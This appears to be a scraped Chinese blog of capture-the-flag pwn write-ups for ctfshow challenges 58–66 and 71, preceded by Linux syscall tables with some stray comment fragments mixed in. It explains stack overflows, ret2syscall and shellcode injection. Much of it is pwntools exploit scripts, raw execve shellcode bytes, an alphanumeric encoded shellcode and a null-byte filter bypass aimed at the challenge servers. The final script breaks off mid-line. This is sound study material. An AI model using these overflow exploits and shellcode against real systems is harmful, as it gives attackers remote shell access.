207setresuid32 208getresuid32 209setresgid32 210getresgid32 211chown32 212setuid32 213setgid32 214setfsuid32 215setfsgid32 216pivot_root 217mincore 218madvise 219madvise1 219getdents64 220fcntl64 221gettid 224readahead 225setxattr 226lsetxattr 227fsetxattr 228getxattr 229lgetxattr 230fgetxattr 231listxattr 232llistxattr 233flistxattr 234removexattr 235lremovexattr 236fremovexattr 237tkill 238sendfile64 239futex 240sched_setaffinity 241sched_getaffinity 242set_thread_area 243get_thread_area 244io_setup 245io_destroy 246io_getevents 247io_submit 248io_cancel 249fadvise64 250exit_group 252lookup_dcookie 253epoll_create 254epoll_ctl 255epoll_wait 256remap_file_pages 257set_tid_address 258timer_create 259timer_settime 260timer_gettime 261timer_getoverrun 262timer_delete 263clock_settime 264clock_gettime 265clock_getres 266clock_nanosleep 267statfs64 268fstatfs64 269tgkill 270utimes 271fadvise64_64 272vserver 273mbind 274get_mempolicy 275set_mempolicy 276mq_open 277mq_unlink 278mq_timedsend 279mq_timedreceive 280mq_notify 281mq_getsetattr 282kexec_load 283waitid 284sys_setaltroot 285add_key 286request_key 287keyctl 288ioprio_set 289ioprio_get 290inotify_init 291inotify_add_watch 292inotify_rm_watch 293migrate_pages 294openat 295mkdirat 296mknodat 297fchownat 298futimesat 299fstatat64 300unlinkat 301renameat 302linkat 303symlinkat 304readlinkat 305fchmodat 306faccessat 307pselect6 308ppoll 309unshare 310set_robust_list 311get_robust_list 312splice 313sync_file_range 314tee 315vmsplice 316move_pages 317getcpu 318epoll_pwait 319utimensat 320signalfd 321timerfd_create 322eventfd 323fallocate 324timerfd_settime 325timerfd_gettime 326signalfd4 327eventfd2 328epoll_create1 329dup3 330pipe2 331inotify_init1 332preadv 333pwritev 334rt_tgsigqueueinfo 335perf_event_open 336recvmmsg 337fanotify_init 338 fanotify_mark 339 prlimit64 340 name_to_handle_at 341 open_by_handle_at 342 clock_adjtime 343 syncfs 344sendmmsg 345set_ns 346 process_vm_readv 347process_vm_writev 348\n\n\n\nLinux 64 位系统read 0write 1open 2close 3stat 4fstat 5lstat 6poll 7lseek 8mmap 9mprotect 10munmap 11brk 12rt_sigaction 13rt_sigprocmask 14rt_sigreturn 15ioctl 16pread64 17pwrite64 18readv 19writev 20access 21pipe 22select 23sched_yield 24mremap 25msync 26mincore 27madvise 28shmget 29shmat 30shmctl 31dup 32dup2 33pause 34nanosleep 35getitimer 36alarm 37setitimer 38getpid 39sendfile 40socket 41connect 42accept 43sendto 44recvfrom 45sendmsg 46recvmsg 47shutdown 48bind 49listen 50getsockname 51getpeername 52socketpair 53setsockopt 54getsockopt 55clone 56fork 57vfork 58execve 59exit 60wait4 61kill 62uname 63semget 64semop 65semctl 66shmdt 67msgget 68msgsnd 69msgrcv 70msgctl 71fcntl 72flock 73fsync 74fdatasync 75truncate 76ftruncate 77getdents 78getcwd 79chdir 80fchdir 81rename 82mkdir 83rmdir 84creat 85link 86unlink 87symlink 88readlink 89chmod 90fchmod 91chown 92fchown 93lchown 94umask 95gettimeofday 96getrlimit 97getrusage 98sysinfo 99times 100ptrace 101getuid 102syslog 103y end the stuff that never runs during the benchmarks */getgid 104setuid 105setgid 106geteuid 107getegid 108setpgid 109getppid 110getpgrp 111setsid 112setreuid 113setregid 114getgroups 115setgroups 116setresuid 117getresuid 118setresgid 119getresgid 120getpgid 121setfsuid 122setfsgid 123getsid 124capget 125capset 126rt_sigpending 127rt_sigtimedwait 128rt_sigqueueinfo 129rt_sigsuspend 130sigaltstack 131utime 132mknod 133d for a.out */uselib 134personality 135ustat 136statfs 137fstatfs 138sysfs 139getpriority 140setpriority 141sched_setparam 142sched_getparam 143sched_setscheduler 144sched_getscheduler 145sched_get_priority_max 146sched_get_priority_min 147sched_rr_get_interval 148mlock 149munlock 150mlockall 151munlockall 152vhangup 153modify_ldt 154pivot_root 155_sysctl 156prctl 157arch_prctl 158adjtimex 159setrlimit 160chroot 161sync 162acct 163settimeofday 164mount 165umount2 166swapon 167swapoff 168reboot 169sethostname 170setdomainname 171iopl 172ioperm 173create_module 174init_module 175delete_module 176get_kernel_syms 177query_module 178quotactl 179nfsservctl 180or LiS/STREAMS */getpmsg 181putpmsg 182or AFS */afs_syscall 183or tux */tuxcall 184security 185gettid 186readahead 187setxattr 188lsetxattr 189fsetxattr 190getxattr 191lgetxattr 192fgetxattr 193listxattr 194llistxattr 195flistxattr 196removexattr 197lremovexattr 198fremovexattr 199tkill 200time 201futex 202sched_setaffinity 203sched_getaffinity 204set_thread_area 205io_setup 206io_destroy 207io_getevents 208io_submit 209io_cancel 210get_thread_area 211lookup_dcookie 212epoll_create 213epoll_ctl_old 214epoll_wait_old 215remap_file_pages 216getdents64 217set_tid_address 218restart_syscall 219semtimedop 220fadvise64 221timer_create 222timer_settime 223timer_gettime 224timer_getoverrun 225timer_delete 226clock_settime 227clock_gettime 228clock_getres 229clock_nanosleep 230exit_group 231epoll_wait 232epoll_ctl 233tgkill 234utimes 235vserver 236mbind 237set_mempolicy 238get_mempolicy 239mq_open 240mq_unlink 241mq_timedsend 242mq_timedreceive 243mq_notify 244mq_getsetattr 245kexec_load 246waitid 247add_key 248request_key 249keyctl 250ioprio_set 251ioprio_get 252inotify_init 253inotify_add_watch 254inotify_rm_watch 255migrate_pages 256openat 257mkdirat 258mknodat 259fchownat 260futimesat 261newfstatat 262unlinkat 263renameat 264linkat 265symlinkat 266readlinkat 267fchmodat 268faccessat 269pselect6 270ppoll 271unshare 272set_robust_list 273get_robust_list 274splice 275tee 276sync_file_range 277vmsplice 278move_pages 279utimensat 280ORE_getcpu /* implemented as a vsyscall */epoll_pwait 281signalfd 282timerfd_create 283eventfd 284fallocate 285timerfd_settime 286timerfd_gettime 287accept4 288signalfd4 289eventfd2 290epoll_create1 291dup3 292pipe2 293inotify_init1 294preadv 295pwritev 296rt_tgsigqueueinfo 297perf_event_open 298recvmmsg 299fanotify_init 300fanotify_mark 301prlimit64 302name_to_handle_at 303open_by_handle_at 304clock_adjtime 305syncfs 306sendmmsg 307set_ns 308get_cpu 309process_vm_readv 310process_vm_writev 311\n\n2.传递参数\n32位系统所需参数依次存放在 寄存器eax、ebx、ecx、edx、esi、edi 和 ebp \n\n\n\n设置 eax 寄存器\n设置 edx 寄存器\n设置 ecx 寄存器\n设置 ebx 寄存器\n\n\n\n0xb(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n64位系统所需参数依次存放在寄存器rax、rdi、rsi、rdx、r10、r8 和 r9 \n\n\n\n设置 rax 寄存器\n设置 rdx 寄存器\n设置 rsi 寄存器\n设置 rdi 寄存器\n\n\n\n0x3b(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n3.触发系统调用\n32 位系统使用 int0x80 指令来触发系统调用，64 位系统使用 syscall 指令来触发系统调用\n例题ctfshow71（32位ret2syscall）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   NoDebuginfo:  Yes\n\n32位，开启NX保护，栈不可执行\npwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\nstatically linked静态编译\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;===============CTFshow--PWN===============&quot;);  puts(&quot;Try to use ret2syscall!&quot;);  gets(&amp;v4);  return 0;\n\ngets栈溢出\n偏移：112\n0x080bb196 : pop eax ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x080be408 : /bin/sh\n0x08049421 : int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = b&#x27;a&#x27;*(112)+p32(pop_eax_ret)               payload += p32(0xb)+p32(pop_edx_ecx_ebx_ret)   #系统调用号payload += p32(0)+p32(0)+p32(binsh)            #三个参数payload += p32(int_0x80)                       #触发系统调用io.sendline(payload)io.interactive()\n","categories":["第四周"],"tags":["知识点"]},{"title":"shellcode（ctfshow58-64）","url":"/2025/01/30/shellcode1/","content":"ctfshow58Arch:       i386-32-little   RELRO:      Partial RELRO   Stack:      No canary found   NX:         NX unknown - GNU_STACK missing   PIE:        No PIE (0x8048000)   Stack:      Executable   RWX:        Has RWX segments   Stripped:   No\n\n32位程序，NX保护没开，栈可以执行\nida：main函数调用了ctfshow函数\nadd     esp, 10hsub     esp, 0Chlea     eax, [ebp+s]push    eax             ; scall    ctfshow\n\nctfshow函数\nint __cdecl ctfshow(char *s)&#123;  gets(s);  return puts(s);&#125;\n\n存在gets函数栈溢出，并且gets函数写入的地址 [ebp+s] 在后面会被调用，且栈可以执行，所以我们直接写入shellcode就可以\ncall    _getsadd     esp, 10hsub     esp, 0Chpush    [ebp+s]\n\nadd     esp, 10hlea     eax, [ebp+s]call    eax\n\nexp:\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28158)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow59这道题与上一道一样只不过是64位的，注意生成shellcode的时候需要注明架构为64位\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow60Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No    Debuginfo:  Yes\n\n32位，NX保护没有开启，栈可以执行\nida：gets函数存在栈溢出，使用strncpy函数将对应的字符串复制到 buf2 处\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-pwn can u pwn me here!!&quot;);  gets(s);  strncpy(buf2, s, 100u);  printf(&quot;See you ~&quot;);  return 0;&#125;\n\n我们看一下buf2所在的位置\n\n然后看看bss段是否可执行\n\n我们看到是不可执行的，但是去看了一下师傅们的wp发现是可执行的，应该是版本的问题\n\n思路：我们将shellcode写入，然后填充垃圾数据覆盖返回地址为buf2，就可以了，因为strncpy函数会将对应的字符串复制到 buf2 处，所以shellcode也会被复制到buf2\n偏移为：112\nida是有问题的\n\nexp：\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28249)buf2 = 0x0804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&#x27;a&#x27;)+p32(buf2)           #使用 ljust 函数将 shellcode 字符串用a补充到长度为 112io.sendline(payload)io.interactive()\n\nctfshow61Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        PIE enabled    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：我们发现 printf函数将v5的地址打印出来了，我们可以将v5的地址接受保存下来，并将shellcode写入v5，再将返回地址覆盖为v5的地址就可以，但是v5到ret_addr的长度只有16字节，而shellcode要32字节，不会了，看一下师傅们的wp\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 v5[2]; // [rsp+0h] [rbp-10h] BYREF  v5[0] = 0LL;  v5[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, v5);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  gets(v5);  return 0;&#125;\n\n原来不只是长度不够，还有leave的问题\nleave的作用相当于MOV SP,BP；POP BP。 因为leave指令会释放栈空间，因此我们不能使用v5后面的24字节\n而且v5后的8个字节也不能存放（这里需要存放返回地址），所以我们只能将shellcode放在v5后的32字节的地方，并将返回地址改为v5后面32字节的地方\n如何接受到v5的正确地址：\n\n我们可以看到v5的地址实在[]里\nio.recvuntil(b&#x27;[&#x27;)                        #输入流中首先接收数据直到遇到 &#x27;[&#x27; 字符为止v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)        #再次接收直到遇到 &#x27;]&#x27; 字符为止v5 = int(v5, 16)                          #将变量 v5 解析为一个十六进制的整数#获取到的是字节串,p64()的参数是整形,要把字节串转化成整形# 不能用hex(int(v5_addr, 16)),因为hex的结果是字符串,不能传给p64()\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28114)shellcode = asm(shellcraft.sh())io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))                    #打印v5的十六进制表示payload = b&#x27;a&#x27;*(0x10+0x8)         #溢出到返回地址payload += p64(v5+32)             #将将返回地址改为v5后面32字节的地方payload += shellcode              #将shellcode写入到v5后面32字节的地方io.sendline(payload)io.interactive()\n\nctfshow62Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：和上一题一样，只不过read为0x38字节（56），栈空间24，返回地址8不可用，所以最大写入的是56-24-8&#x3D;24，而自动生成的shellcode是0x30，所以不够了，看了一下师傅们的wp，需要找更短的shellcode\nshellcode =b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;   #22bytes\n\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\nexp\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28286)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow63ida：和上一题一样，只不过可读入的更少了，只有0x37（55），55-24-8&#x3D;23，上一题用的shellcode为22字节，还可以用\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x37uLL);  return 0;&#125;\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28224)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow64Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，NX保护开启，栈不可执行\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [esp+8h] [ebp-10h]  buf = mmap(0, 0x400u, 7, 34, 0, 0);  alarm(0xAu);  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 2, 0);  puts(&quot;Some different!&quot;);  if ( read(0, buf, 0x400u) &lt; 0 )  &#123;    puts(&quot;Illegal entry!&quot;);    exit(1);  &#125;  ((void (*)(void))buf)();  return 0;\n\n首先 buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0)没看懂，搜了一下\n#include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);\n\n\n\n\naddr\nlength\nprot\nflags\nfd\noffset\n\n\n\n指定映射区域的起始地址（则由操作系统选择合适的地址）\n映射区域的大小\n决定映射区域的保护属性（设置为7可读可写可执行）\n决定映射的类型和行为\n文件描述符，用于指定要映射的文件\n文件的偏移量，指定从文件的哪个位置开始映射\n\n\n这个题将buf 将被设置为映射区域的起始地址，映射区域的大小为 0x400 字节，保护标志为7（映射的内存区域可以读、写和执行）\n大小0x400，足够写入shellcode，并且可以执行\n在看后面是一个if，是判断是否读取成功，如果 read 返回值小于 0，说明读取失败，并且退出程序\n最后((void (*)(void))buf)()\n将 buf 强制转换为一个函数指针类型，并且调用buf，我们将shellcode写入buf，就会被调用\nexp\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28112)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\n\n\n","categories":["第三周"],"tags":["wp"]},{"title":"shellcode（ctfshow65）","url":"/2025/01/31/shellcode2/","content":"ctfshow65Arch:       amd64-64-littleRELRO:      Full RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，开启PIE,完全开启RELRO,Has RWX segments  \nida：无法反编译，借助ai理解一下代码\n汇编代码1.jl (Jump if Less)\ncmp eax, ebxjl loc_1234\n\n如果 eax &lt; ebx，则跳转到 loc_1234\n2.jg (Jump if Greater)\ncmp eax, ebxjg loc_1234\n\n如果 eax &gt; ebx，则跳转到 loc_1234\n3.jle (Jump if Less or Equal)\ncmp eax, ebxjle loc_1234\n\n如果 eax &lt;= ebx，则跳转到 loc_1234\n4.jmp (Jump)\njmp loc_1234\n\n无论条件如何，都会跳转到 loc_1234\n5.cmp (Compare)\ncmp eax, ebx\n\n比较 eax 和 ebx 的大小，并根据结果设置标志位\n6.cdqe、movzx\ncdqemovzx   eax, [rbp+rax+buf]\n\n这个实在看不懂，粘一下师傅们的解释\ncdqe使用eax的最高位拓展rax高32位的所有位 movzx则是按无符号数传送+扩展（16-32） EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位大致就是将我们输入的字符串每一位进行比较\nmain:    push    rbp    mov     rbp, rsp    sub     rsp, 410h    mov     edx, 14h    lea     rsi, aInputYouShellc    mov     edi, 1    mov     eax, 0    call    _write    lea     rax, [rbp+buf]    mov     edx, 400h    mov     rsi, rax    mov     edi, 0    mov     eax, 0    call    _read    mov     [rbp+var_8], eax    cmp     [rbp+var_8], 0    jg      short loc_11AC    mov     eax, 0    jmp     locret_1254\n\n提示用户输入：\n使用 _write 函数向标准输出打印提示信息 &quot;Input you Shellcode\\n&quot;。\n读取用户输入：\n使用 _read 函数从标准输入读取用户输入的数据，存储到缓冲区 buf 中。\nvar_8 存储了 _read 的返回值，表示实际读取的字节数。\n检查输入长度：\n如果 var_8 &gt; 0，表示用户输入了数据，程序跳转到 loc_11AC。\n如果 var_8 &lt;= 0，表示用户没有输入任何内容，程序直接返回\nloc_11AC:    mov     [rbp+var_4], 0    jmp     loc_123Aloc_11B8:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 60h ; &#x27;`&#x27;    jle     short loc_11DA    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 7Ah ; &#x27;z&#x27;    jle     short loc_1236    jmp     loc_11DAloc_11DA:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 40h ; &#x27;@&#x27;    jle     short loc_11FC    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_11FCloc_11FC:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 2Fh ; &#x27;/&#x27;    jle     short loc_121E    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_121Eloc_121E:    lea     rdi, format    mov     eax, 0    call    _printf    mov     eax, 0    jmp     locret_1254loc_1236:    add     [rbp+var_4], 1    jmp     loc_123Aloc_123A:    mov     eax, [rbp+var_4]    cmp     eax, [rbp+var_8]    jl      loc_11B8    lea     rax, [rbp+buf]    call    rax    mov     eax, 0locret_1254:    leave    retn\n\n初始化索引：\n在 loc_11AC，程序将 var_4 初始化为 0。\n循环检查输入内容：\n在 loc_11B8，程序逐字节检查用户输入的内容：\n如果字节值在 [0x2F, 0x5A] 或 [0x40, 0x5A] 或 [0x60, 0x7A] 范围内，程序继续检查下一个字节。\n[0x2F, 0x5A]：/到 Z（包括大小写字母和一些符号）\n[0x40, 0x5A]：@ 到 Z（主要是大写字母和一些符号）\n[0x60, 0x7A]：反引号到  z（主要是小写字母和一些符号）\n如果字节值不在上述范围内，程序打印 &quot;Good,but not right&quot; 并返回。\n执行用户输入：\n如果所有字节都满足条件，程序会将 buf 的地址加载到寄存器 rax 中，并调用 buf。这意味着程序会尝试执行用户输入的内容\n这些范围正好是ASSCII码的范围，我们可以直接将shellcode输入到buf，后面程序就会调用，但是输入的shellcode需要是可见字符string.printable\n生成可见字符shellcode使用alpha3就可以生成\nalpha031.生成shellcodefrom pwn import *context.arch=&#x27;amd64&#x27;sc = asm(shellcraft.sh())with open(&#x27;sc&#x27;, &#x27;bw&#x27;) as f:\tf.write(sc)\n\n2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件python3 sc.py &gt; sc\n\n3.使用alpha3生成string.printable （这里得用 python2）\npython2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器\n\nshellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;\n\n\nexp：from pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28139)shellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload = shellcode io.send(payload)   #注意不能用sendline换行符不在区间里io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"shellcode（ctfshow66）","url":"/2025/02/01/shellcode3/","content":"ctfshow66Arch:       amd64-64-little  RELRO:      Partial RELRO  Stack:      No canary found  NX:         NX enabled  PIE:        No PIE (0x400000)  Stripped:   No\n\n64位，NX栈不可执行开启\nida:\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [rsp+8h] [rbp-8h]  init(argc, argv, envp);  logo();  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);  puts(&quot;Your shellcode is :&quot;);  read(0, buf, 0x200uLL);  if ( !(unsigned int)check(buf) )  &#123;    printf(&quot; ERROR !&quot;);    exit(0);  &#125;  ((void (__fastcall *)(void *))buf)(buf);  return 0;&#125;\n\n这道题与前面ctfshow64差不多。多了一个检查\ncheck：\n__int64 __fastcall check(_BYTE *a1)&#123;  _BYTE *i; // [rsp+18h] [rbp-10h]  while ( *a1 )  &#123;    for ( i = &amp;unk_400F20; *i &amp;&amp; *i != *a1; ++i )      ;    if ( !*i )      return 0LL;    ++a1;  &#125;  return 1LL;&#125;\n\n意思检查数据是与unk_400F20里面的相同，相同返回1（假），不同返回0（真）\n在经过if判断检查是否通过\n检查失败情况：当 check 函数返回 0 时，(unsigned int)check(buf) 的结果为 0，再经过逻辑非运算 !(unsigned int)check(buf) 的结果为 1。此时 if 条件判断为真，程序会执行 if 语句块内的代码，先通过 printf(&quot; ERROR !&quot;); 输出错误信息 &quot; ERROR !&quot;，然后调用 exit(0) 终止程序。exit(0) 一般表示程序正常退出，但在这里实际上是因为输入的 buf 不符合检查要求而提前终止程序。\n检查通过情况：当 check 函数返回 1 时，(unsigned int)check(buf) 的结果为 1，经过逻辑非运算 !(unsigned int)check(buf) 的结果为 0。此时 if 条件判断为假，程序不会执行 if 语句块内的代码，而是继续执行后续的代码，也就是执行 ((void (__fastcall *)(void *))buf)(buf); 这行代码来执行用户输入的 shellcode。\n我们看一下unk_400F20里面的数据\n.rodata:0000000000400F20 unk_400F20      db  5Ah ; Z             ; DATA XREF: check+8↑o.rodata:0000000000400F21                 db  5Ah ; Z.rodata:0000000000400F22                 db  4Ah ; J.rodata:0000000000400F23                 db  20h.rodata:0000000000400F24                 db  6Ch ; l.rodata:0000000000400F25                 db  6Fh ; o.rodata:0000000000400F26                 db  76h ; v.rodata:0000000000400F27                 db  65h ; e.rodata:0000000000400F28                 db  73h ; s.rodata:0000000000400F29                 db  20h.rodata:0000000000400F2A                 db  73h ; s.rodata:0000000000400F2B                 db  68h ; h.rodata:0000000000400F2C                 db  65h ; e.rodata:0000000000400F2D                 db  6Ch ; l.rodata:0000000000400F2E                 db  6Ch ; l.rodata:0000000000400F2F                 db  5Fh ; _.rodata:0000000000400F30                 db  63h ; c.rodata:0000000000400F31                 db  6Fh ; o.rodata:0000000000400F32                 db  64h ; d.rodata:0000000000400F33                 db  65h ; e.rodata:0000000000400F34                 db  2Ch ; ,.rodata:0000000000400F35                 db  61h ; a.rodata:0000000000400F36                 db  6Eh ; n.rodata:0000000000400F37                 db  64h ; d.rodata:0000000000400F38                 db  20h.rodata:0000000000400F39                 db  68h ; h.rodata:0000000000400F3A                 db  65h ; e.rodata:0000000000400F3B                 db  72h ; r.rodata:0000000000400F3C                 db  65h ; e.rodata:0000000000400F3D                 db  20h.rodata:0000000000400F3E                 db  69h ; i.rodata:0000000000400F3F                 db  73h ; s.rodata:0000000000400F40                 db  20h.rodata:0000000000400F41                 db  61h ; a.rodata:0000000000400F42                 db  20h.rodata:0000000000400F43                 db  67h ; g.rodata:0000000000400F44                 db  69h ; i.rodata:0000000000400F45                 db  66h ; f.rodata:0000000000400F46                 db  74h ; t.rodata:0000000000400F47                 db  3Ah ; :.rodata:0000000000400F48                 db  0Fh.rodata:0000000000400F49                 db    5.rodata:0000000000400F4A                 db  20h.rodata:0000000000400F4B                 db  65h ; e.rodata:0000000000400F4C                 db  6Eh ; n.rodata:0000000000400F4D                 db  6Ah ; j.rodata:0000000000400F4E                 db  6Fh ; o.rodata:0000000000400F4F                 db  79h ; y.rodata:0000000000400F50                 db  20h.rodata:0000000000400F51                 db  69h ; i.rodata:0000000000400F52                 db  74h ; t.rodata:0000000000400F53                 db  21h ; !\n\n发现为可见字符串\n绕过if：\n1.我们可以用可见字符串写shellcode\n2.绕过 while(*a)，当它遇到\\x00就不检验了，我们可以使shellcode以\\x00开头\n利用脚本找\\x00开头的汇编代码\nfrom pwn import *from itertools import *import re for i in range(1, 3):    for j in product([p8(k) for k in range(256)], repeat=i):        payload = b&quot;\\x00&quot; + b&quot;&quot;.join(j)        res = disasm(payload)        if (            res != &quot;        ...&quot;            and not re.search(r&quot;\\[\\w*?\\]&quot;, res)            and &quot;.byte&quot; not in res        ):            print(res)            input()\n\n\n找到了一个’\\x00\\xc0’\nexp:\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28156)shellcode = asm(shellcraft.sh())payload = 